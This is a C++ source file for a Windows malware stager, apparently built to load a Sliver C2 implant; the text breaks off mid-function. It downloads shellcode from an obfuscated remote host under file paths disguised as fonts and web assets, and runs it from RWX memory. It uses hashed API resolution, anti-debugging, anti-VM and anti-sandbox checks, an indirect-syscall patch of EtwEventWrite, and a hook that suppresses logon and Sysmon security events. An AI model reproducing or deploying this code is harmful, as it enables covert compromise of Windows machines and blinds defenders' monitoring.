// sliver_stager.cpp
#include <windows.h>
#include <wininet.h>
#include <vector>
// #include <iostream>
#include <string>
#include <intrin.h>   // For __cpuid, __rdtsc, and __nop
#include <iphlpapi.h> // For GetAdaptersInfo
//#include <winternl.h> // << FIX: For PEB structure
#include <algorithm>  // << FIX: For std::transform
#include <cctype>     // << FIX: For std::tolower
#include <random>     // << THÊM VÀO: Cần cho việc tạo số ngẫu nhiên
#include <thread>     // << THÊM VÀO: Cần cho std::this_thread::sleep_for
#include <chrono>     // << THÊM VÀO: Cần cho std::chrono::seconds
#include <TlHelp32.h>
#include <evntprov.h>  

// ============================ HuffLoader Start ============================
#include <stdio.h>
#include "obfusheader.h"
#include <Rpc.h>
#include "huffman.h"
#include "unhooker.c"
#include "structs.h"
#include "aes.h"

#pragma comment(lib, "ntdll")
#define NtCurrentProcess()	   ((HANDLE)-1)
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
// ============================ HuffLoader end ============================


char* concat(const char* a, const char* b) {
	size_t la = strlen(a);
	size_t lb = strlen(b);
	char* r = (char*)malloc(la + lb + 1); // cast cho C++
	if (!r) return NULL;
	memcpy(r, a, la);
	memcpy(r + la, b, lb + 1);
	return r;
}

// WATERMARK("nquangit");
//static const char* BASE_URL = "http://172.31.239.133:23023";
//static const char* SHELLCODE_URL = concat(BASE_URL, "/download.dat");

//auto BASE_URL = MAKEOBF("https://c22.nquangit.io.vn/");
auto BASE_URL = MAKEOBF("https://techlab.nquangit.io.vn");
static const char* SHELLCODE_URL = concat((char*)BASE_URL, OBF("/Roboto_Condensed-Bold.woff2"));
static const char* RESOURCE_PATH_1 = concat((char*)BASE_URL, OBF("/assets/images/logo.png"));
static const char* RESOURCE_PATH_2 = concat((char*)BASE_URL, OBF("/css/main.style.css"));
static const char* RESOURCE_PATH_3 = concat((char*)BASE_URL, OBF("/js/app.bundle.js"));
static const char* RESOURCE_PATH_4 = concat((char*)BASE_URL, OBF("/api/v1/users"));
static const char* RESOURCE_PATH_5 = concat((char*)BASE_URL, OBF("/fonts/roboto.woff2"));
static const char* RESOURCE_PATH_6 = concat((char*)BASE_URL, OBF("/media/videos/tutorial.mp4"));
static const char* RESOURCE_PATH_7 = concat((char*)BASE_URL, OBF("/downloads/document.pdf"));
static const char* RESOURCE_PATH_8 = concat((char*)BASE_URL, OBF("/static/icons/favicon.ico"));
static const char* RESOURCE_PATH_9 = concat((char*)BASE_URL, OBF("/data/config.json"));
static const char* RESOURCE_PATH_10 = concat((char*)BASE_URL, OBF("/pages/about-us.html"));
static const char* RESOURCE_PATH_11 = concat((char*)BASE_URL, OBF("/products/item-details/12345"));
static const char* RESOURCE_PATH_12 = concat((char*)BASE_URL, OBF("/user/profile/avatar.jpg"));

//AESKey = "tKVGD+hSd3bPeq(r";  // 16 bytes ASCII printable
//AESIV = "hebBiVKG+B8(P?/S";  // 16 bytes ASCII printable
//static const char* AESKey = "tKVGD+hSd3bPeq(r";
//static const char* AESIV = "hebBiVKG+B8(P?/S";
auto AESKey = MAKEOBF("4428472b4b6250655368566d59713374");
auto AESIV = MAKEOBF("38792f423f4528472b4b625065536856");

// KEY: nqu@ng1ttech|ab+
// IV: 1vNqu@ng|t*U!zdl

auto AESKeyEtW = MAKEOBF("6e7175406e673174746563687c61622b");
auto AESIVEtw = MAKEOBF("31764e7175406e677c742a55217a646c");

// ============================ HuffLoader start ============================



std::vector<int> sensitiveEventIDs = {
	4688,  // New process created
	4697,  // A service was installed
	4673,  // Privileged service was called
	4674,  // Operation attempted on a privileged object
	4624,  // Successful logon
	4625,  // Failed logon
	4648,  // Logon using explicit credentials
	4634,  // Logoff
	4647,  // User initiated logoff
	4768,  // Kerberos authentication ticket (TGT) requested
	4769,  // Kerberos service ticket requested
	4776,  // Credential validation via LSASS
	4720,  // User account created
	4722,  // User account enabled
	4724,  // Password reset attempted
	4732,  // User added to group
	4733,  // User removed from group
	4672,  // Logon with special privileges

	// Sysmon event IDs
	1,     // Sysmon: Process creation
	3,     // Sysmon: Network connection
	7,     // Sysmon: DLL loaded
	8,     // Sysmon: CreateRemoteThread detected
	10,    // Sysmon: Process access (code injection, etc.)
	11,    // Sysmon: File created
	13,    // Sysmon: Registry value set
	22,    // Sysmon: Named pipe created
	23,    // Sysmon: Named pipe connected
	25     // Sysmon: Driver loaded
};


typedef struct {
	LIST_ENTRY e[3];
	HMODULE base;
	void* entry;
	UINT size;
	UNICODE_STRING dllPath;
	UNICODE_STRING dllname;
} LDR_MODULE;



DWORD calcHash(char* data) {
	DWORD hash = 0x99;
	for (int i = 0; i < strlen(data); i++) {
		hash += data[i] + (hash << 1);
	}
	return hash;
}

static DWORD calcHashModule(LDR_MODULE* mdll) {
	char name[64];
	size_t i = 0;

	while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
		name[i] = (char)mdll->dllname.Buffer[i];
		i++;
	}
	name[i] = 0;
	return calcHash((char*)CharLowerA(name));
}

static HMODULE getModule(DWORD myHash) {
	// print(STATUS, "[+] Searching for module with hash: %u (dec) / 0x%lx (hexa) \n", myHash, myHash);

	HMODULE module = NULL;
	PVOID pebPtr = (PVOID)GetPEB(); // Get PEB address from TEB
	INT_PTR peb = (INT_PTR)pebPtr;
	auto ldr = 0x18;
	auto flink = 0x10;

	INT_PTR Mldr = *(INT_PTR*)(peb + ldr);
	INT_PTR M1flink = *(INT_PTR*)(Mldr + flink);
	LDR_MODULE* Mdl = (LDR_MODULE*)M1flink;
	do {
		Mdl = (LDR_MODULE*)Mdl->e[0].Flink;
		if (Mdl->base != NULL) {
			if (calcHashModule(Mdl) == myHash) {
				module = (HMODULE)Mdl->base;
				// print(SUCCESS, "[+] Module loaded successfully at address: 0x%p, Module hash = 0x%lx\n", module, myHash);
				return module;
			}
		}
	} while (M1flink != (INT_PTR)Mdl);

	// print(FAIL, "[-] Module with hash 0x%lx not found.\n", myHash);
	return module;
}

LPVOID getAPIAddr(HMODULE module, DWORD myHash) {
	if (module == NULL) {
		// print(FAIL, "[-] Invalid module handle.\n");
		return NULL;
	}

	// print(STATUS, "[+] Searching for API with hash: 0x%lx\n", myHash);

	PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)module;
	if (img_dos_header == NULL) {
		// print(FAIL, "[-] Failed to retrieve DOS header.\n");
		return NULL;
	}

	PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)module + img_dos_header->e_lfanew);
	if (img_nt_header == NULL) {
		// print(FAIL, "[-] Failed to retrieve NT header.\n");
		return NULL;
	}

	DWORD exportDirVA = img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportDirVA == 0) {
		// print(FAIL, "[-] Export directory not found.\n");
		return NULL;
	}

	PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + exportDirVA);
	PDWORD fAddr = (PDWORD)((LPBYTE)module + img_edt->AddressOfFunctions);
	PDWORD fNames = (PDWORD)((LPBYTE)module + img_edt->AddressOfNames);
	PWORD fOrd = (PWORD)((LPBYTE)module + img_edt->AddressOfNameOrdinals);

	for (DWORD i = 0; i < img_edt->NumberOfNames; i++) {
		LPSTR pFuncName = (LPSTR)((LPBYTE)module + fNames[i]);
		if (calcHash(pFuncName) == myHash) {
			LPVOID addr = (LPVOID)((LPBYTE)module + fAddr[fOrd[i]]);
			// print(LINE, "/* ------------------------------------------------------- */\n");
			// print(SUCCESS, "[+] API found. Address: 0x%p\n", addr);
			return addr;
		}
	}

	// print(FAIL, "[-] API with hash 0x%lx not found.\n", myHash);
	return NULL;
}

BOOL CheckDebugger() {
	return (BOOL)((PEB*)GetPEB())->bBeingDebugged;
}
// ============================ HuffLeader end ============================



#ifdef _MSC_VER
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wininet.lib")
#endif

// =================================================================
// HÀM SLEEP NGẪU NHIÊN
// =================================================================
void RandomSleep()
{
	// 1. Khởi tạo bộ tạo số ngẫu nhiên chất lượng cao
	std::random_device rd;  // Lấy một seed ngẫu nhiên từ phần cứng
	std::mt19937 gen(rd()); // Khởi tạo bộ sinh số Mersenne Twister với seed đó

	// 2. Định nghĩa khoảng giá trị ngẫu nhiên (từ 10 đến 30)
	std::uniform_int_distribution<> distrib(10, 30);

	// 3. Lấy số giây ngẫu nhiên
	int sleep_seconds = distrib(gen);

	// Dòng này để debug, bạn có thể xóa đi trong bản phát hành
	// std::cout << "[DEBUG] Sleeping for " << sleep_seconds << " seconds..." << std::endl;

	// 4. Thực hiện sleep
	std::this_thread::sleep_for(std::chrono::seconds(sleep_seconds));
}

// =================================================================
// KỸ THUẬT CHỐNG GỠ LỖI (ANTI-DEBUGGING)
// =================================================================

// 1. Kiểm tra PEB (Process Environment Block)
bool CheckPebDebugger()
{
#ifdef _M_X64
	// Đối với x64, PEB được lấy từ thanh ghi GS
	auto peb = (PPEB)__readgsqword(0x60);
	return peb->BeingDebugged;
#else
	// Đối với x86, PEB được lấy từ thanh ghi FS
	auto peb = (PPEB)__readfsdword(0x30);
	return peb->BeingDebugged;
#endif
}

// 2. Kiểm tra thời gian thực thi (Timing Attack)
bool CheckTiming()
{
	UINT64 startTime = __rdtsc();
	// Thực hiện một vài lệnh không đáng kể
	for (int i = 0; i < 100; ++i)
	{
		// Sử dụng chỉ thị tiền xử lý để chọn đúng mã cho từng trình biên dịch
#ifdef _MSC_VER
		__nop(); // Dành cho trình biên dịch của Microsoft (MSVC)
#elif __GNUC__
		asm volatile("nop"); // Dành cho trình biên dịch GCC/G++ (MinGW)
#endif
	}
	UINT64 endTime = __rdtsc();
	// Nếu thời gian thực thi quá dài (ví dụ: hơn 10000 chu kỳ), có thể có debugger
	if (endTime - startTime > 10000)
	{
		return true;
	}
	return false;
}

// =================================================================
// KỸ THUẬT CHỐNG MÁY ẢO (ANTI-VM)
// =================================================================

// 1. Kiểm tra bằng lệnh CPUID
bool CheckVmByCpuid()
{
	int cpuInfo[4];
	__cpuid(cpuInfo, 1);
	// Bit 31 của thanh ghi ECX được gọi là "hypervisor present bit". [6]
	// Nếu nó bằng 1, chương trình đang chạy trên một hypervisor (máy ảo).
	return (cpuInfo[2] >> 31) & 1;
}

// 2. Kiểm tra địa chỉ MAC
bool CheckVmByMacAddress()
{
	// Các tiền tố MAC phổ biến của máy ảo
	const std::vector<std::string> vmMacPrefixes = {
		"00:05:69", // VMware [3]
		"00:0C:29", // VMware [3]
		"00:1C:14", // VMware [3]
		"00:50:56", // VMware [3]
		"08:00:27"  // VirtualBox [4]
	};

	ULONG bufferSize = sizeof(IP_ADAPTER_INFO);
	std::vector<BYTE> buffer(bufferSize);
	PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)buffer.data();

	if (GetAdaptersInfo(pAdapterInfo, &bufferSize) == ERROR_BUFFER_OVERFLOW)
	{
		buffer.resize(bufferSize);
		pAdapterInfo = (PIP_ADAPTER_INFO)buffer.data();
	}

	if (GetAdaptersInfo(pAdapterInfo, &bufferSize) == NO_ERROR)
	{
		while (pAdapterInfo)
		{
			char macStr[18];
			sprintf_s(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
				pAdapterInfo->Address[0], pAdapterInfo->Address[1], pAdapterInfo->Address[2],
				pAdapterInfo->Address[3], pAdapterInfo->Address[4], pAdapterInfo->Address[5]);

			std::string currentMac(macStr);
			for (const auto& prefix : vmMacPrefixes)
			{
				if (currentMac.rfind(prefix, 0) == 0)
				{
					return true; // Tìm thấy MAC của VM
				}
			}
			pAdapterInfo = pAdapterInfo->Next;
		}
	}
	return false;
}

// 3. Kiểm tra Registry
bool CheckVmByRegistry()
{
	const char* vmKeys[] = {
		"SOFTWARE\\VMware, Inc.\\VMware Tools",
		"SOFTWARE\\Oracle\\VirtualBox Guest Additions" };
	HKEY hKey;
	for (const char* key : vmKeys)
	{
		if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
			return true;
		}
	}
	return false;
}

// =================================================================
// KỸ THUẬT CHỐNG SANDBOX (ANTI-SANDBOX)
// =================================================================

// 1. Kiểm tra thời gian hoạt động của hệ thống
bool CheckSandboxByUptime()
{
	// GetTickCount64 trả về số mili giây kể từ khi hệ thống khởi động. [7]
	// Nếu uptime dưới 10 phút (600000 ms), có thể là sandbox.
	return GetTickCount64() < 600000;
}

// 2. Kiểm tra tên người dùng
bool CheckSandboxByUsername()
{
	char username[257];
	DWORD size = sizeof(username);
	GetUserNameA(username, &size);
	std::string userStr(username);
	std::transform(userStr.begin(), userStr.end(), userStr.begin(), ::tolower);

	const std::vector<std::string> sandboxUsernames = { "sandbox", "test", "user" };
	for (const auto& name : sandboxUsernames)
	{
		if (userStr == name)
		{
			return true;
		}
	}
	return false;
}

// =================================================================
// HÀM TỔNG HỢP VÀ TÍCH HỢP VÀO TLS CALLBACK
// =================================================================

void PerformAntiAnalysisChecks()
{
	if (IsDebuggerPresent() || CheckPebDebugger() || CheckTiming())
	{
		// std::cout << "Debugger detected!" << std::endl;
		ExitProcess(1);
	}

	// if (CheckVmByCpuid() || CheckVmByMacAddress() || CheckVmByRegistry())
	// {
	//     std::cout << "Virtual machine detected!" << std::endl;
	//     ExitProcess(2);
	// }

	// if (CheckSandboxByUptime() || CheckSandboxByUsername())
	// {
	//     std::cout << "Sandbox environment detected!" << std::endl;
	//     ExitProcess(3);
	// }
}

// prototype TLS callback
#ifdef __cplusplus
extern "C" {
#endif
	VOID NTAPI TlsCallback(PVOID DllHandle, DWORD dwReason, PVOID Reserved);
#ifdef __cplusplus
}
#endif

#ifdef _M_IX86
#pragma comment(linker, "/INCLUDE:__tls_used")
#pragma comment(linker, "/INCLUDE:_p_tls_callback")
#else
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma comment(linker, "/INCLUDE:p_tls_callback")
#endif

// --- Sửa: đảm bảo biến có external linkage và tên C (không mangle)
// Wrap extern "C" chỉ khi biên dịch bằng C++:
#ifdef __cplusplus
extern "C" {
#endif

#ifdef _M_X64
	// trên x64 nếu dùng 'const' trong C++ nó sẽ có internal linkage => phải thêm extern
#pragma const_seg(".CRT$XLB")
	extern const PIMAGE_TLS_CALLBACK p_tls_callback; // khai báo extern
#pragma const_seg()
	// định nghĩa ở ngoài (khai báo với external linkage + initializer)
#pragma const_seg(".CRT$XLB")
	const PIMAGE_TLS_CALLBACK p_tls_callback = TlsCallback;
#pragma const_seg()
#else
	// x86: data_seg (non-const) đã có external linkage
#pragma data_seg(".CRT$XLB")
	PIMAGE_TLS_CALLBACK p_tls_callback = TlsCallback;
#pragma data_seg()
#endif

#ifdef __cplusplus
} // extern "C"
#endif

// TLS callback implementation
VOID NTAPI TlsCallback(PVOID DllHandle, DWORD dwReason, PVOID Reserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		//RandomSleep();
		// PerformAntiAnalysisChecks();
	}
}

DWORD getHashFromString(char* string)
{
	size_t stringLength = strnlen_s(string, 50);
	DWORD hash = 0x35;

	for (size_t i = 0; i < stringLength; i++)
	{
		hash += (hash * 0x1304f23f + string[i]) & 0xffffff;
	}
	// printf("%s: 0x00%x\n", string, hash);
	return hash;
}

PDWORD getFunctionAddressByHash(char* library, DWORD hash)
{
	PDWORD functionAddress = (PDWORD)0;

	// Get base address of the module in which our exported function of interest resides (kernel32 in the case of CreateThread)
	HMODULE libraryBase = LoadLibraryA(library);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

	// Get RVAs to exported function related information
	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

	// Iterate through exported functions, calculate their hashes and check if any of them match our hash of 0x00544e304 (CreateThread)
	// If yes, get its virtual memory address (this is where CreateThread function resides in memory of our process)
	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++)
	{
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;
		DWORD_PTR functionAddressRVA = 0;

		// Calculate hash for this exported function
		DWORD functionNameHash = getHashFromString(functionName);

		// If hash for CreateThread is found, resolve the function address
		if (functionNameHash == hash)
		{
			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
			// printf("%s : 0x%x : %p\n", functionName, functionNameHash, functionAddress);
			return functionAddress;
		}
	}
}

// Define CreateThread function prototype
using nquangitCreateThread = HANDLE(NTAPI*)(
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	SIZE_T dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD dwCreationFlags,
	LPDWORD lpThreadId);

void DownloadShellcode(const char* url, std::vector<BYTE>& outBuffer, bool* status)
{
	HINTERNET hInternet = InternetOpenA(OBF("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternet)
	{
		// std::cerr << "InternetOpenA failed: " << GetLastError() << "\n";
		*status = false; // Set status to false to indicate failure
		return;
	}

	// HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
	DWORD dwFlags = INTERNET_FLAG_RELOAD;

	if (_strnicmp(url, OBF("https://"), 8) == 0)
	{
		dwFlags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
	}

	HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, dwFlags, 0);
	if (!hFile)
	{
		// std::cerr << "InternetOpenUrlA failed: " << GetLastError() << "\n";
		InternetCloseHandle(hInternet);
		*status = false; // Set status to false to indicate failure
		return;
	}

	const DWORD chunkSize = 4096;
	BYTE buffer[chunkSize];
	DWORD bytesRead = 0;

	do
	{
		if (!InternetReadFile(hFile, buffer, chunkSize, &bytesRead))
		{
			// std::cerr << "InternetReadFile failed: " << GetLastError() << "\n";
			InternetCloseHandle(hFile);
			InternetCloseHandle(hInternet);
			*status = false; // Set status to false to indicate failure
			return;
		}
		outBuffer.insert(outBuffer.end(), buffer, buffer + bytesRead);
	} while (bytesRead > 0);

	InternetCloseHandle(hFile);
	InternetCloseHandle(hInternet);
	*status = true; // Set status to true to indicate success
	return;
}

//void rwx_hunter(std::vector<BYTE>& shellcode)
//{
//    MEMORY_BASIC_INFORMATION mbi = {};
//    LPVOID offset = 0;
//    HANDLE process = NULL;
//    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
//    PROCESSENTRY32 processEntry = {};
//    processEntry.dwSize = sizeof(PROCESSENTRY32);
//    DWORD bytesWritten = 0;
//
//    Process32First(snapshot, &processEntry);
//    while (Process32Next(snapshot, &processEntry))
//    {
//        process = OpenProcess(MAXIMUM_ALLOWED, false, processEntry.th32ProcessID);
//        if (process)
//        {
//            while (VirtualQueryEx(process, offset, &mbi, sizeof(mbi)))
//            {
//                offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
//                if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
//                {
//                    //std::wcout << processEntry.szExeFile << "\n";
//                    // std::cout << "\tRWX: 0x" << std::hex << mbi.BaseAddress << "\n";
//                    WriteProcessMemory(process, mbi.BaseAddress, shellcode.data(), shellcode.size(), NULL);
//                    CreateRemoteThread(process, NULL, NULL, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, NULL, NULL);
//                }
//            }
//            offset = 0;
//        }
//        CloseHandle(process);
//    }
//}

int execute(std::vector<BYTE>& shellcode)
{
	// Allocate RWX memory
	void* execMem = VirtualAlloc(
		NULL,
		shellcode.size(),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (!execMem)
	{
		// std::cerr << "VirtualAlloc failed: " << GetLastError() << "\n";
		return 1;
	}

	// Copy shellcode into allocated memory
	memcpy(execMem, shellcode.data(), shellcode.size());

	// Custom CreateThread
	PDWORD functionAddress = getFunctionAddressByHash((char*)"kernel32", 0x0067f1aa4);
	nquangitCreateThread CreateThread = (nquangitCreateThread)functionAddress;
	// Create a thread to execute the shellcode
	HANDLE hThread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(execMem), NULL, 0, NULL);

	if (!hThread)
	{
		// std::cerr << "CreateThread failed: " << GetLastError() << "\n";
		VirtualFree(execMem, 0, MEM_RELEASE);
		return 1;
	}

	// Wait indefinitely for the shellcode thread to finish
	WaitForSingleObject(hThread, INFINITE);

	// Clean up
	CloseHandle(hThread);
	VirtualFree(execMem, 0, MEM_RELEASE);
	return 0;
}



void etw_interceptor(HMODULE mod, int* check_status) {
	*check_status = 0; // Initialize status to success

	LPVOID addr = NULL;
	WORD syscallNum;
	LPVOID pEtwEventWrite = getAPIAddr(mod, 0x128423f0); // Hash of EtwEventWrite
	LPVOID backuppEtwEventWrite = getAPIAddr(mod, 0x128423f0); // Hash of EtwEventWrite

	DWORD OlEtwProtect;
	SIZE_T patchBytesSize = 1;

	addr = getAPIAddr(mod, 0x59ef896aad4); // Hash of NtProtectVirtualMemory
	if ((syscallNum = FindAmmunitionsAndPrepareGun(addr)) == INVALID_SSN)
	{
		*check_status = 1; // Set status to indicate failure
		return;
	}

	AmmunitionPrepare(syscallNum);

	NTSTATUS NtEtwProtectStatus = GunFire(NtCurrentProcess(), &pEtwEventWrite, (PSIZE_T)&patchBytesSize, PAGE_EXECUTE_READ | PAGE_GUARD, &OlEtwProtect);
	if (!NT_SUCCESS(NtEtwProtectStatus)) {
		// print(FAIL, "[!] Failed in sysNtProtectVirtualMemory (0x%lx).\n", NtProtectStatus);
		*check_status = 3; // Set status to indicate failure
		return;
	}
	else {
		// print(SUCCESS, "[+] Memory permissions updated to execute the payload.\n");
	}

	//AddVectoredExceptionHandler(1, VectoredHandler);

	//ForceEtwCall();
}


void BypassETW(HMODULE mod, int* check_status) {
	*check_status = 0; // Initialize status to success

	LPVOID addr = NULL;
	WORD syscallNum;
	LPVOID pEtwEventWrite = getAPIAddr(mod, 0x128423f0); // Hash of EtwEventWrite
	LPVOID backuppEtwEventWrite = getAPIAddr(mod, 0x128423f0); // Hash of EtwEventWrite
		        
	/*
		Modifided
		*
		* https://defuse.ca/online-x86-assembler.htm#disassembly
		*
			mov         r11, rsp
			sub         rsp, 88
			mov         qword ptr[r11 - 24], r9
			xor eax, eax
			mov         dword ptr[r11 - 32], r8d
			xor r9d, r9d
			mov         qword ptr[r11 - 40], rax
			xor r8d, r8d
			mov         qword ptr[r11 - 48], rax
			mov         word ptr[rsp + 32], ax
			nop
			add         rsp, 88
			ret
	*/

	// ============================================ START OF THE Decrypt instruction ETW ====================================================

	DWORD OlEtwProtect = 0;
	SIZE_T patchBytesSize = 0;

	/*
		ASM code to patch EtwEventWrite function:
			sub         rsp, 88
			push        rax
			pop         rax
			add         rsp, 88
			ret
	*/


	//BYTE patchBytes[] = { 0x48, 0x83, 0xec, 0x58, 0x50, 0x58, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x00 };
	BYTE encryptedPatchBytes[] = { 0xaa, 0x25, 0x2c, 0xa9, 0x98, 0x18, 0x53, 0xae, 0xcb, 0x7f, 0x25, 0x17, 0x68, 0x53, 0x69, 0x2f };
	patchBytesSize = sizeof(encryptedPatchBytes);

	// Decrypt the patch bytes using AES
	std::vector<BYTE> encryptedVector;
	encryptedVector.assign(encryptedPatchBytes, encryptedPatchBytes + patchBytesSize);

	std::vector<BYTE> decryptedVector;
	decryptedVector = AESDecryptor::aes_decrypt(encryptedVector, (char*)AESKeyEtW, (char*)AESIVEtw);

	patchBytesSize = decryptedVector.size();
	// ============================================ End OF THE Decrypt instruction ETW ====================================================


	addr = getAPIAddr(mod, 0x59ef896aad4); // Hash of NtProtectVirtualMemory
	if ((syscallNum = FindAmmunitionsAndPrepareGun(addr)) == INVALID_SSN)
	{
		*check_status = 1; // Set status to indicate failure
		return;
	}

	AmmunitionPrepare(syscallNum);

	NTSTATUS NtEtwProtectStatus = GunFire(NtCurrentProcess(), &pEtwEventWrite, (PSIZE_T)&patchBytesSize, PAGE_EXECUTE_READWRITE, &OlEtwProtect);
	if (!NT_SUCCESS(NtEtwProtectStatus)) {
		// print(FAIL, "[!] Failed in sysNtProtectVirtualMemory (0x%lx).\n", NtProtectStatus);
		*check_status = 3; // Set status to indicate failure
		return;
	}
	else {
		// print(SUCCESS, "[+] Memory permissions updated to execute the payload.\n");
	}

	//*(PBYTE)pEtwEventWrite = 0xC3;
	/*for (SIZE_T i = 0; i < sizeof(patchBytes); i++)
		((PBYTE)backuppEtwEventWrite)[i] = ((PBYTE)patchBytes)[i];*/

	for (SIZE_T i = 0; i < decryptedVector.size(); i++)
		((PBYTE)backuppEtwEventWrite)[i] = (decryptedVector)[i];

	//memcpy(backuppEtwEventWrite, patchBytes, sizeof(patchBytes));


	// Restore the original protection of the EtwEventWrite function
	pEtwEventWrite = backuppEtwEventWrite; // Hash of EtwEventWrite
	patchBytesSize = decryptedVector.size();

	//addr = getAPIAddr(module, 0x59ef896aad4); // Hash of NtProtectVirtualMemory
	//if ((syscallNum = FindAmmunitionsAndPrepareGun(addr)) == INVALID_SSN)
	//{
	//    *run_status = 1; // Set status to indicate failure
	//    return;
	//}

	//AmmunitionPrepare(syscallNum);

	// Replace the first byte of EtwEventWrite with a RET instruction (0xC3)
	NtEtwProtectStatus = GunFire(NtCurrentProcess(), &pEtwEventWrite, (PSIZE_T)&patchBytesSize, OlEtwProtect, &OlEtwProtect);
	if (!NT_SUCCESS(NtEtwProtectStatus)) {
		// print(FAIL, "[!] Failed to modify EtwEventWrite (0x%lx).\n", NtEtwProtectStatus);
		*check_status = 4; // Set status to indicate failure
		return;
	}
	// print(SUCCESS, "[+] ETW bypassed successfully.\n");
}


typedef ULONG(WINAPI* pEtwEventWrite)(
	REGHANDLE RegHandle,
	PCEVENT_DESCRIPTOR EventDescriptor,
	ULONG UserDataCount,
	PEVENT_DATA_DESCRIPTOR UserData
	);

pEtwEventWrite g_EtwEventWrite = nullptr;


ULONG WINAPI MyEtwEventWrite(
	REGHANDLE RegHandle,
	PCEVENT_DESCRIPTOR EventDescriptor,
	ULONG UserDataCount,
	PEVENT_DATA_DESCRIPTOR UserData
) {
	char buffer[512];

	sprintf_s(buffer,
		"[HOOK] EtwEventWrite\nRegHandle: %p\nEvent ID: %u\nUserDataCount: %lu\n",
		(void*)RegHandle,
		EventDescriptor->Id,
		UserDataCount
	);

	OutputDebugStringA(buffer);

	if (std::find(sensitiveEventIDs.begin(), sensitiveEventIDs.end(), EventDescriptor->Id) != sensitiveEventIDs.end()) {
		OutputDebugStringA("[HOOK] >>> Sensitive Event ID detected, suppressing...\n");
		return 0;
	}

	return g_EtwEventWrite(RegHandle, EventDescriptor, UserDataCount, UserData);
}



void ForceEtwCall() {
	OutputDebugStringA("Calling EtwEventWrite manually to trigger hook...\n");

	EVENT_DESCRIPTOR desc;
	desc.Id = 0x01;
	desc.Version = 1;
	desc.Channel = 0;
	desc.Level = 4;       // Informational
	desc.Opcode = 0;
	desc.Task = 1;
	desc.Keyword = 0x1;

	// User data payload (a simple string message)
	const char* message = "Hello from EtwEventWrite!";
	EVENT_DATA_DESCRIPTOR data;
	EventDataDescCreate(&data, message, (ULONG)(strlen(message) + 1)); // Include null terminator

	// Resolve EtwEventWrite function
	pEtwEventWrite EtwFunc = (pEtwEventWrite)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "EtwEventWrite");
	if (EtwFunc) {
		EtwFunc((REGHANDLE)1, &desc, 1, &data);  // (REGHANDLE)1 is a dummy handle
	}
}


LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {
		if ((void*)ExceptionInfo->ContextRecord->Rip == g_EtwEventWrite) {
			ExceptionInfo->ContextRecord->Rip = (DWORD64)&MyEtwEventWrite;

			DWORD oldProtect;
			VirtualProtect(g_EtwEventWrite, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &oldProtect);
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

void SetupHook() {
	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
	g_EtwEventWrite = (pEtwEventWrite)GetProcAddress(hNtdll, "EtwEventWrite");

